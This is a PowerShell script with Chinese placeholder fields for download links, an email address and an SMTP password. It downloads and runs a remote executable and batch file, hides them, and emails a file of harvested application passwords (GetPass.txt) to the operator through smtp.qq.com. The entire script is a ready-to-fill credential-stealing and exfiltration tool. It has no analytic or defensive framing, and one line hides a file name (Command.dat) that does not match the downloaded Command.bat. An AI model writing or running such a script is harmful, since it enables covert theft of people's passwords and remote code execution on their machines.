(new-object System.Net.WebClient).DownloadFile('这里添加GET.rar的下载链接','D:\Get.exe');
(new-object System.Net.WebClient).DownloadFile('这里添加Command.rar的下载链接','D:\Command.bat');
D:\Command.bat;
attrib +h Get.exe
attrib +h Command.dat
$SMTPServer = 'smtp.qq.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('这里添加你的邮箱', '这里添加smtp密码');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = '这里添加你的邮箱'
$ReportEmail.To.Add('这里添加你的邮箱')
$ReportEmail.Subject = 'GetPass'
$ReportEmail.Body = 'Passwords In Applications' 
$ReportEmail.Attachments.Add('D:\GetPass.txt')
$SMTPInfo.Send($ReportEmail)
attrib +h GetPass.txt
